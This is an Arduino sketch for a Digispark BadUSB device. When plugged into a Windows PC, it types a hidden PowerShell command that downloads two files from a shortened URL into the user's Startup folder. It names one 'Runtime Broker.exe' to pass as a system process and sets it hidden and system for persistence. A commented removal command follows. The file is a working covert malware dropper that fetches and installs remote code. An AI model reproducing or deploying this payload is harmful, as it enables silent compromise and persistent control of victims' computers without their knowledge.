#include "DigiKeyboardFr.h"

void setup() {
  //opens windows run
  DigiKeyboardFr.delay(1);
  DigiKeyboardFr.sendKeyStroke(KEY_R, 0 | MOD_GUI_LEFT );
  DigiKeyboardFr.delay(50);
  //type: powershell -windowstyle hidden -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";iwr 3.ly/acKvl -o \"Runtime Broker.exe\";iwr 3.ly/acKvu -o System.vbs;ATTRIB +H +S \"Runtime Broker.exe\""
  DigiKeyboardFr.println("powershell -windowstyle hidden -command \"cd \\\"$env:AppData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\";iwr 3.ly/acKvl -o \\\"Runtime Broker.exe\\\";iwr 3.ly/acKvu -o System.vbs\";ATTRIB +H +S *.exe");
}

void loop() {
}

// removal command :
// powershell -command "cd \"$env:AppData\Microsoft\Windows\Start Menu\Programs\Startup\";ATTRIB -H -S \"Runtime Broker.exe\";rm \"Runtime Broker.exe\";rm System.vbs"
